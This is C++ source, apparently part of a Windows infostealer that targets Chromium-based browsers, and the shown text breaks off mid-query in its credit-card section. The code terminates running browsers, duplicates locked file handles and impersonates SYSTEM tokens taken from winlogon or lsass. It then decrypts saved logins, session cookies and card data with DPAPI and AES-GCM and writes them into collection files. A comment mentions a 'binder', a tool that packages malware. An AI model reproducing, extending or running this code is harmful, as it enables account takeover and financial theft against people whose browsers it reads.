static bool streamCopyHandles(HANDLE hSrc, HANDLE hDst) {
    SetFilePointer(hSrc, 0, nullptr, FILE_BEGIN);
    char buffer[65536];
    DWORD read = 0, written = 0;
    while (ReadFile(hSrc, buffer, sizeof(buffer), &read, nullptr) && read > 0) {
        if (!WriteFile(hDst, buffer, read, &written, nullptr) || written != read)
            return false;
    }
    return true;
}

static std::string normalizePathLower(std::string p) {
    for (char& c : p) {
        if (c == '/') c = '\\';
        c = (char)tolower((unsigned char)c);
    }
    // strip \\?\ prefix
    if (p.rfind("\\\\?\\", 0) == 0)
        p = p.substr(4);
    return p;
}

static std::string handlePathA(HANDLE h) {
    wchar_t wbuf[MAX_PATH * 4] = {};
    // flags=0 matches working handle-dup tests
    DWORD n = GetFinalPathNameByHandleW(h, wbuf, (DWORD)(sizeof(wbuf) / sizeof(wbuf[0])), 0);
    if (n == 0 || n >= sizeof(wbuf) / sizeof(wbuf[0]))
        return {};
    char abuf[MAX_PATH * 4] = {};
    WideCharToMultiByte(CP_ACP, 0, wbuf, -1, abuf, sizeof(abuf), nullptr, nullptr);
    return normalizePathLower(abuf);
}

static bool sameFilePath(const std::string& a, const std::string& b) {
    if (a == b) return true;
    if (a.empty() || b.empty()) return false;
    if (a.size() >= b.size())
        return a.compare(a.size() - b.size(), b.size(), b) == 0 &&
               (a.size() == b.size() || a[a.size() - b.size() - 1] == '\\');
    return b.compare(b.size() - a.size(), a.size(), a) == 0 &&
           (b.size() == a.size() || b[b.size() - a.size() - 1] == '\\');
}

// Find PIDs locking a path via Restart Manager (fast, no full handle table scan).
static std::vector<DWORD> findLockingPids(const std::string& path) {
    std::vector<DWORD> pids;
    typedef DWORD(WINAPI* RmStartSession_t)(DWORD*, DWORD, WCHAR*);
    typedef DWORD(WINAPI* RmEndSession_t)(DWORD);
    typedef DWORD(WINAPI* RmRegisterResources_t)(DWORD, UINT, LPCWSTR*, UINT, void*, UINT, LPCWSTR*);
    typedef DWORD(WINAPI* RmGetList_t)(DWORD, UINT*, UINT*, void*, LPDWORD);

    HMODULE hRm = LoadLibraryA("RstrtMgr.dll");
    if (!hRm) return pids;
    auto pStart = (RmStartSession_t)GetProcAddress(hRm, "RmStartSession");
    auto pEnd = (RmEndSession_t)GetProcAddress(hRm, "RmEndSession");
    auto pReg = (RmRegisterResources_t)GetProcAddress(hRm, "RmRegisterResources");
    auto pList = (RmGetList_t)GetProcAddress(hRm, "RmGetList");
    if (!pStart || !pEnd || !pReg || !pList) {
        FreeLibrary(hRm);
        return pids;
    }

    DWORD session = 0;
    WCHAR key[CCH_RM_SESSION_KEY + 1] = {};
    if (pStart(&session, 0, key) != ERROR_SUCCESS) {
        FreeLibrary(hRm);
        return pids;
    }

    wchar_t wpath[MAX_PATH * 2] = {};
    MultiByteToWideChar(CP_ACP, 0, path.c_str(), -1, wpath, MAX_PATH * 2);
    LPCWSTR files[1] = { wpath };
    if (pReg(session, 1, files, 0, nullptr, 0, nullptr) == ERROR_SUCCESS) {
        UINT needed = 0, count = 0;
        DWORD reason = 0;
        DWORD rc = pList(session, &needed, &count, nullptr, &reason);
        if ((rc == ERROR_MORE_DATA || rc == ERROR_SUCCESS) && needed > 0) {
            std::vector<BYTE> buf(needed * sizeof(RM_PROCESS_INFO));
            count = needed;
            if (pList(session, &needed, &count, buf.data(), &reason) == ERROR_SUCCESS) {
                auto* infos = (RM_PROCESS_INFO*)buf.data();
                for (UINT i = 0; i < count; i++)
                    pids.push_back(infos[i].Process.dwProcessId);
            }
        }
    }
    pEnd(session);
    FreeLibrary(hRm);
    return pids;
}

// Brave exclusive-locks Network\Cookies. Duplicate the open handle from the locking process only.
static bool copyFileViaHandleDup(const std::string& src, const std::string& dst) {
    typedef LONG NTSTATUS;
    typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    auto NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return false;

    enablePrivilege("SeDebugPrivilege");
    enablePrivilege("SeBackupPrivilege");

    std::string target = normalizePathLower(src);
    char full[MAX_PATH * 2] = {};
    if (GetFullPathNameA(src.c_str(), sizeof(full), full, nullptr))
        target = normalizePathLower(full);

    std::vector<DWORD> pids = findLockingPids(src);
    if (pids.empty()) {
        // fallback: browser process names (may be slower)
        const wchar_t* names[] = {
            L"brave.exe", L"chrome.exe", L"msedge.exe", L"opera.exe",
            L"vivaldi.exe", L"browser.exe", L"chromium.exe", nullptr
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {};
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (int i = 0; names[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, names[i]) == 0) {
                            pids.push_back(pe.th32ProcessID);
                            break;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    if (pids.empty()) return false;

    // Open each locker once
    std::map<DWORD, HANDLE> procs;
    for (DWORD pid : pids) {
        if (procs.count(pid)) continue;
        HANDLE h = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if (h) procs[pid] = h;
    }
    if (procs.empty()) return false;

    const ULONG SystemExtendedHandleInformation = 64;
    ULONG bufSize = 1 << 22;
    std::vector<BYTE> buf(bufSize);
    NTSTATUS st = -1;
    for (int attempt = 0; attempt < 8; attempt++) {
        ULONG ret = 0;
        st = NtQuerySystemInformation(SystemExtendedHandleInformation, buf.data(), bufSize, &ret);
        if (st == 0) break;
        if (ret > bufSize) bufSize = ret + (1 << 16);
        else bufSize *= 2;
        buf.resize(bufSize);
    }
    if (st != 0) {
        for (auto& kv : procs) CloseHandle(kv.second);
        return false;
    }

#pragma pack(push, 8)
    struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        PVOID Object;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR HandleValue;
        ULONG GrantedAccess;
        USHORT CreatorBackTraceIndex;
        USHORT ObjectTypeIndex;
        ULONG HandleAttributes;
        ULONG Reserved;
    };
    struct SYSTEM_HANDLE_INFORMATION_EX {
        ULONG_PTR NumberOfHandles;
        ULONG_PTR Reserved;
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
    };
#pragma pack(pop)

    auto* info = (SYSTEM_HANDLE_INFORMATION_EX*)buf.data();
    bool okCopy = false;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles && !okCopy; i++) {
        auto& e = info->Handles[i];
        DWORD pid = (DWORD)e.UniqueProcessId;
        auto it = procs.find(pid);
        if (it == procs.end()) continue;

        HANDLE hDup = nullptr;
        if (!DuplicateHandle(it->second, (HANDLE)e.HandleValue, GetCurrentProcess(), &hDup,
            0, FALSE, DUPLICATE_SAME_ACCESS)) {
            continue;
        }
        if (!hDup || hDup == INVALID_HANDLE_VALUE)
            continue;

        std::string path = handlePathA(hDup);
        if (path.empty() || !sameFilePath(path, target)) {
            CloseHandle(hDup);
            continue;
        }

        HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDst == INVALID_HANDLE_VALUE) {
            CloseHandle(hDup);
            break;
        }
        okCopy = streamCopyHandles(hDup, hDst);
        CloseHandle(hDst);
        CloseHandle(hDup);
        if (!okCopy)
            DeleteFileA(dst.c_str());
    }

    for (auto& kv : procs) CloseHandle(kv.second);
    return okCopy;
}

static bool copyFileWithRetry(const std::string& src, const std::string& dst, int retries = 8) {
    enablePrivilege("SeBackupPrivilege");
    for (int i = 0; i < retries; i++) {
        if (CopyFileA(src.c_str(), dst.c_str(), FALSE))
            return true;

        HANDLE hSrc = CreateFileA(src.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSrc == INVALID_HANDLE_VALUE) {
            hSrc = CreateFileA(src.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        }
        if (hSrc != INVALID_HANDLE_VALUE) {
            HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDst != INVALID_HANDLE_VALUE) {
                BOOL ok = streamCopyHandles(hSrc, hDst);
                CloseHandle(hDst);
                CloseHandle(hSrc);
                if (ok)
                    return true;
                DeleteFileA(dst.c_str());
            } else {
                CloseHandle(hSrc);
            }
        }
        Sleep(200);
    }

    // Brave exclusive-locks Network\Cookies — duplicate open handle from browser process
    return copyFileViaHandleDup(src, dst);
}

// Chrome/Edge lock Cookies hard while running — force close before grab
static void closeBrowserProcesses() {
    const wchar_t* targets[] = {
        L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe",
        L"opera_gx.exe", L"vivaldi.exe", L"chromium.exe", L"browser.exe",
        nullptr
    };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h) {
                        TerminateProcess(h, 0);
                        CloseHandle(h);
                    }
                    break;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    Sleep(800);
}

static std::vector<std::string> getChromiumDataFiles(const std::string& profilePath, const std::string& userDataRoot) {
    return {
        profilePath + "\\Network\\Cookies",
        profilePath + "\\Cookies",
        profilePath + "\\Login Data",
        profilePath + "\\Login Data For Account",
        profilePath + "\\History",
        profilePath + "\\Web Data",
        profilePath + "\\Bookmarks",
        profilePath + "\\Preferences",
        userDataRoot + "\\Local State",
        profilePath + "\\Local State"
    };
}

static std::string sanitizeFolderName(std::string s) {
    for (char& c : s) {
        if (c == ' ' || c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|')
            c = '_';
    }
    return s;
}

static std::string base64Decode(const std::string& in) {
    DWORD needed = 0;
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, nullptr, &needed, nullptr, nullptr))
        return {};
    std::string out(needed, '\0');
    if (!CryptStringToBinaryA(in.c_str(), (DWORD)in.size(), CRYPT_STRING_BASE64, (BYTE*)&out[0], &needed, nullptr, nullptr))
        return {};
    out.resize(needed);
    return out;
}

static std::vector<BYTE> dpapiDecrypt(const BYTE* data, DWORD len) {
    DATA_BLOB in = {};
    in.pbData = (BYTE*)data;
    in.cbData = len;
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return {};
    std::vector<BYTE> res(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return res;
}

static bool enablePrivilege(LPCWSTR name) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp = {};
    if (!LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

static std::vector<BYTE> dpapiDecryptAsSystem(const BYTE* data, DWORD len) {
    if (!data || !len) return {};
    enablePrivilege(L"SeDebugPrivilege");

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return {};

    DWORD systemPid = 0;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"lsass.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"services.exe") == 0) {
                systemPid = pe.th32ProcessID;
                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0)
                    break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (!systemPid) return {};

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPid);
    if (!hProc)
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hProc) return {};

    HANDLE hToken = nullptr, hDup = nullptr;
    std::vector<BYTE> res;
    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenImpersonation, &hDup)) {
            if (SetThreadToken(nullptr, hDup) || ImpersonateLoggedOnUser(hDup)) {
                res = dpapiDecrypt(data, len);
                RevertToSelf();
            }
            CloseHandle(hDup);
        }
        CloseHandle(hToken);
    }
    CloseHandle(hProc);
    return res;
}

static std::string extractJsonString(const std::string& json, const std::string& key) {
    std::string tag = "\"" + key + "\":\"";
    size_t p = json.find(tag);
    if (p == std::string::npos) {
        tag = "\"" + key + "\": \"";
        p = json.find(tag);
        if (p == std::string::npos) return {};
    }
    p += tag.size();
    size_t e = json.find('"', p);
    if (e == std::string::npos) return {};
    return json.substr(p, e - p);
}

static std::vector<BYTE> extractAppBoundKeyBytes(const std::vector<BYTE>& plain) {
    if (plain.size() < 16) return {};
    if (plain.size() >= 8) {
        DWORD valLen = 0;
        memcpy(&valLen, plain.data(), 4);
        if (valLen < plain.size() && (size_t)4 + valLen + 4 <= plain.size()) {
            DWORD keyLen = 0;
            memcpy(&keyLen, plain.data() + 4 + valLen, 4);
            size_t keyOff = (size_t)4 + valLen + 4;
            if (keyLen >= 16 && keyLen <= 64 && keyOff + keyLen <= plain.size())
                return std::vector<BYTE>(plain.begin() + keyOff, plain.begin() + keyOff + keyLen);
        }
    }
    if (plain.size() >= 32)
        return std::vector<BYTE>(plain.end() - 32, plain.end());
    return plain;
}

static std::vector<BYTE> getAppBoundKeyAdmin(const std::string& userDataRoot) {
    std::string localState = userDataRoot + "\\Local State";
    if (!pathExists(localState)) return {};
    auto raw = readFileToVector(localState);
    if (raw.empty()) return {};
    std::string json(raw.begin(), raw.end());
    std::string b64 = extractJsonString(json, "app_bound_encrypted_key");
    if (b64.empty()) return {};
    std::string decoded = base64Decode(b64);
    if (decoded.size() < 8) return {};

    const BYTE* blob = (const BYTE*)decoded.data();
    DWORD blobLen = (DWORD)decoded.size();
    if (decoded.size() >= 4 && decoded.compare(0, 4, "APPB") == 0) {
        blob += 4;
        blobLen -= 4;
    }

    // Retry up to 5 times with increasing delays — DPAPI may not be ready at boot
    for (int attempt = 0; attempt < 5; attempt++) {
        if (attempt > 0)
            Sleep((DWORD)(2000 + attempt * 1500));

        auto step1 = dpapiDecryptAsSystem(blob, blobLen);
        if (step1.empty()) {
            step1 = dpapiDecrypt(blob, blobLen);
            if (step1.empty()) continue;
        }
        auto step2 = dpapiDecrypt(step1.data(), (DWORD)step1.size());
        if (step2.empty()) {
            auto key = extractAppBoundKeyBytes(step1);
            if (!key.empty()) return key;
            continue;
        }
        auto key = extractAppBoundKeyBytes(step2);
        if (!key.empty()) return key;
    }
    return {};
}

// IElevator COM path disabled: wrong vtable offsets crash (0xC0000005).
// Admin SYSTEM+user DPAPI is the reliable path with binder requireAdministrator.
static std::vector<BYTE> getAppBoundKeyViaElevator(const std::string&, const std::string&) {
    return {};
}

static std::vector<BYTE> getChromiumMasterKey(const std::string& userDataRoot) {
    std::string localState = userDataRoot + "\\Local State";
    if (!pathExists(localState)) return {};
    auto raw = readFileToVector(localState);
    if (raw.empty()) return {};
    std::string json(raw.begin(), raw.end());
    std::string b64 = extractJsonString(json, "encrypted_key");
    if (b64.empty()) return {};
    std::string decoded = base64Decode(b64);
    if (decoded.size() < 5) return {};
    if (decoded.compare(0, 5, "DPAPI") == 0)
        decoded = decoded.substr(5);
    return dpapiDecrypt((const BYTE*)decoded.data(), (DWORD)decoded.size());
}

static std::vector<BYTE> getChromiumAppBoundKey(const std::string& /*browserName*/, const std::string& userDataRoot) {
    // Requires elevation (SYSTEM DPAPI). Binder already forces admin.
    return getAppBoundKeyAdmin(userDataRoot);
}

// AES-GCM for v10/v11/v20: prefix(3) + nonce(12) + cipher + tag(16)
static std::string aesGcmDecryptRaw(const std::vector<BYTE>& masterKey, const BYTE* blob, int blobLen) {
    if (!blob || blobLen < 3 + 12 + 16 || masterKey.empty()) return {};
    bool okPrefix =
        (blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1')) ||
        (blob[0] == 'v' && blob[1] == '2' && blob[2] == '0');
    if (!okPrefix) return {};

    const BYTE* nonce = blob + 3;
    int cipherLen = blobLen - 3 - 12 - 16;
    if (cipherLen < 0) return {};
    const BYTE* cipher = blob + 3 + 12;
    const BYTE* tag = blob + blobLen - 16;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        return {};
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
            (PUCHAR)masterKey.data(), (ULONG)masterKey.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;

    std::vector<BYTE> plain((size_t)cipherLen + 16);
    ULONG outLen = 0;
    NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)cipher, (ULONG)cipherLen, &authInfo,
        nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st != 0 || outLen == 0) return {};
    plain.resize(outLen);
    while (!plain.empty() && plain.back() == 0) plain.pop_back();
    return std::string(plain.begin(), plain.end());
}

static std::string aesGcmDecrypt(const std::vector<BYTE>& masterKey, const BYTE* blob, int blobLen) {
    return aesGcmDecryptRaw(masterKey, blob, blobLen);
}

static bool looksLikeText(const std::string& s) {
    if (s.empty()) return false;
    size_t printable = 0;
    for (unsigned char c : s) {
        if (c >= 32 && c < 127) printable++;
        else if (c == '\t' || c == '\n' || c == '\r') printable++;
    }
    return printable * 100 / s.size() >= 85;
}

static std::string sanitizeDecrypted(std::string s) {
    while (!s.empty() && (s.back() == '\0' || (unsigned char)s.back() < 32))
        s.pop_back();
    if (s.empty()) return s;

    size_t bad = 0;
    for (unsigned char c : s) if (c < 32 || c >= 127) bad++;
    if (bad == 0) return s;

    // cookies v20 often have 32-byte binary prefix after AES
    if (s.size() > 32) {
        std::string tail = s.substr(32);
        size_t tbad = 0;
        for (unsigned char c : tail) if (c < 32 || c >= 127) tbad++;
        if (tbad == 0 && tail.size() >= 4) return tail;
    }

    size_t afterBin = 0;
    for (size_t i = 0; i < s.size(); i++) {
        unsigned char c = (unsigned char)s[i];
        if (c < 32 || c >= 127) afterBin = i + 1;
    }
    if (afterBin > 0 && afterBin < s.size()) {
        std::string tail = s.substr(afterBin);
        if (looksLikeText(tail) && tail.size() >= 4) return tail;
    }

    std::string stripped;
    for (unsigned char c : s)
        if (c >= 32 && c < 127) stripped.push_back((char)c);
    if (stripped.size() >= 4) return stripped;
    return s;
}

static std::string decryptChromiumValue(
    const std::vector<BYTE>& masterKey,
    const std::vector<BYTE>& appBoundKey,
    const BYTE* blob, int blobLen,
    bool cookieStyle = false)
{
    if (!blob || blobLen <= 0) return {};

    // v10 / v11 with classic DPAPI master key
    if (blobLen >= 3 && blob[0] == 'v' && blob[1] == '1' && (blob[2] == '0' || blob[2] == '1')) {
        std::string r = aesGcmDecryptRaw(masterKey, blob, blobLen);
        if (!r.empty()) return sanitizeDecrypted(std::move(r));
        return {};
    }

    // v20 app-bound AES key
    if (blobLen >= 3 && blob[0] == 'v' && blob[1] == '2' && blob[2] == '0') {
        if (appBoundKey.size() >= 16) {
            std::string r = aesGcmDecryptRaw(appBoundKey, blob, blobLen);
            if (!r.empty()) {
                // cookie plaintext has 32-byte header
                if (cookieStyle && r.size() > 32)
                    r = r.substr(32);
                return sanitizeDecrypted(std::move(r));
            }
        }
        // last resort: try classic master key (some builds)
        if (masterKey.size() >= 16) {
            std::string r = aesGcmDecryptRaw(masterKey, blob, blobLen);
            if (!r.empty()) {
                if (cookieStyle && r.size() > 32) r = r.substr(32);
                return sanitizeDecrypted(std::move(r));
            }
        }
        return "[v20-appbound]";
    }

    auto plain = dpapiDecrypt(blob, (DWORD)blobLen);
    if (plain.empty()) return {};
    return sanitizeDecrypted(std::string(plain.begin(), plain.end()));
}

static std::string sqlText(SqliteApi& api, sqlite3_stmt* st, int col) {
    const unsigned char* t = api.column_text(st, col);
    return t ? std::string((const char*)t) : std::string();
}

static void exportChromiumReadable(
    const std::string& browserName,
    const std::string& profileName,
    const std::string& profilePath,
    const std::string& userDataRoot,
    std::vector<std::pair<std::string, std::vector<char>>>& out)
{
    auto& api = sqliteApi();
    if (!api.ok()) return;

    std::vector<BYTE> masterKey = getChromiumMasterKey(userDataRoot);
    std::vector<BYTE> appBoundKey = getChromiumAppBoundKey(browserName, userDataRoot);
    std::string folder = "browser_data/" + sanitizeFolderName(browserName) + "/" + sanitizeFolderName(profileName) + "/";

    auto copyDb = [&](const std::string& src) -> std::string {
        if (!pathExists(src)) return {};
        std::string tmp = getTempDir() + "sql_" + std::to_string(GetTickCount64()) + ".db";
        if (!copyFileWithRetry(src, tmp)) return {};
        // WAL only — never copy -shm (invalid after copy, makes SQLite see empty DB)
        std::string wal = src + "-wal";
        if (pathExists(wal)) copyFileWithRetry(wal, tmp + "-wal");
        DeleteFileA((tmp + "-shm").c_str());
        return tmp;
    };

    auto cleanupDb = [](const std::string& tmp) {
        if (tmp.empty()) return;
        DeleteFileA(tmp.c_str());
        DeleteFileA((tmp + "-wal").c_str());
        DeleteFileA((tmp + "-shm").c_str());
    };

    // --- Logins ---
    {
        std::ostringstream txt;
        txt << "=== Logins: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        for (const char* rel : { "\\Login Data", "\\Login Data For Account" }) {
            std::string tmp = copyDb(profilePath + rel);
            if (tmp.empty()) continue;
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT origin_url, username_value, password_value FROM logins";
                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string url = sqlText(api, st, 0);
                        std::string user = sqlText(api, st, 1);
                        const void* blob = api.column_blob(st, 2);
                        int blen = api.column_bytes ? api.column_bytes(st, 2) : 0;
                        std::string pass = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        if (url.empty() && user.empty() && pass.empty()) continue;
                        txt << "URL: " << url << "\nUSER: " << user << "\nPASS: " << pass << "\n---\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total logins: " << count << "\n";
        if (appBoundKey.empty())
            txt << "Note: app_bound_key missing (v20 may stay encrypted; run elevated)\n";
        else
            txt << "app_bound_key: OK (" << appBoundKey.size() << " bytes)\n";
        std::string s = txt.str();
        out.push_back({ folder + "logins.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Cookies ---
    {
        std::ostringstream txt;
        txt << "=== Cookies: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        for (const char* rel : { "\\Network\\Cookies", "\\Cookies" }) {
            std::string src = profilePath + rel;
            bool exists = pathExists(src);
            WIN32_FILE_ATTRIBUTE_DATA fad = {};
            DWORD srcSize = 0;
            if (GetFileAttributesExA(src.c_str(), GetFileExInfoStandard, &fad))
                srcSize = fad.nFileSizeLow;
            txt << "[dbg] path=" << src << " exists=" << (exists ? 1 : 0)
                << " size=" << srcSize << "\n";
            if (!exists) continue;

            std::string tmp = copyDb(src);
            if (tmp.empty()) {
                txt << "[dbg] copy FAILED err=" << GetLastError() << "\n";
                continue;
            }
            WIN32_FILE_ATTRIBUTE_DATA tad = {};
            DWORD tmpSize = 0;
            if (GetFileAttributesExA(tmp.c_str(), GetFileExInfoStandard, &tad))
                tmpSize = tad.nFileSizeLow;
            txt << "[dbg] copy OK tmp=" << tmp << " size=" << tmpSize << "\n";

            sqlite3* db = nullptr;
            int openRc = api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr);
            if (openRc == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, value FROM cookies";
                int prepRc = api.prepare_v2(db, q, -1, &st, nullptr);
                txt << "[dbg] open=" << openRc << " prepare=" << prepRc << "\n";
                if (prepRc == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string host = sqlText(api, st, 0);
                        std::string name = sqlText(api, st, 1);
                        std::string path = sqlText(api, st, 2);
                        int secure = api.column_int ? api.column_int(st, 3) : 0;
                        const void* blob = api.column_blob(st, 6);
                        int blen = api.column_bytes ? api.column_bytes(st, 6) : 0;
                        std::string val = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, true);
                        std::string plainCol = sqlText(api, st, 7);
                        if (val.empty() || !looksLikeText(val)) {
                            if (!plainCol.empty() && looksLikeText(plainCol))
                                val = plainCol;
                            else if (val.empty())
                                val = plainCol.empty() ? "[encrypted]" : sanitizeDecrypted(plainCol);
                            else
                                val = sanitizeDecrypted(val);
                        }
                        txt << host << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << path << "\t"
                            << (secure ? "TRUE" : "FALSE") << "\t0\t" << name << "\t" << val << "\n";
                        count++;
                        if (count >= 8000) break;
                    }
                    api.finalize(st);
                } else {
                    // schema fallback without plain value column
                    st = nullptr;
                    const char* q2 = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
                    prepRc = api.prepare_v2(db, q2, -1, &st, nullptr);
                    txt << "[dbg] prepare_fallback=" << prepRc << "\n";
                    if (prepRc == SQLITE_OK && st) {
                        while (api.step(st) == SQLITE_ROW) {
                            std::string host = sqlText(api, st, 0);
                            std::string name = sqlText(api, st, 1);
                            std::string path = sqlText(api, st, 2);
                            int secure = api.column_int ? api.column_int(st, 3) : 0;
                            const void* blob = api.column_blob(st, 6);
                            int blen = api.column_bytes ? api.column_bytes(st, 6) : 0;
                            std::string val = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, true);
                            if (val.empty() || !looksLikeText(val))
                                val = val.empty() ? "[encrypted]" : sanitizeDecrypted(val);
                            txt << host << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << path << "\t"
                                << (secure ? "TRUE" : "FALSE") << "\t0\t" << name << "\t" << val << "\n";
                            count++;
                            if (count >= 8000) break;
                        }
                        api.finalize(st);
                    }
                }
                api.close(db);
            } else {
                txt << "[dbg] open FAILED rc=" << openRc << "\n";
            }
            DeleteFileA(tmp.c_str());
            DeleteFileA((tmp + "-wal").c_str());
            DeleteFileA((tmp + "-shm").c_str());
            DeleteFileA((tmp + "-journal").c_str());
            if (count > 0) break;
        }
        txt << "Total cookies: " << count << "\n";
        if (appBoundKey.empty())
            txt << "Note: app_bound_key missing (v20 stays encrypted; run elevated)\n";
        else
            txt << "app_bound_key: OK (" << appBoundKey.size() << " bytes)\n";
        txt << "master_key: " << (masterKey.empty() ? "FAIL" : ("OK (" + std::to_string(masterKey.size()) + " bytes)")) << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "cookies.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Credit cards ---
    {
        std::ostringstream txt;
        txt << "=== Credit Cards: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\Web Data");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q =
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards";
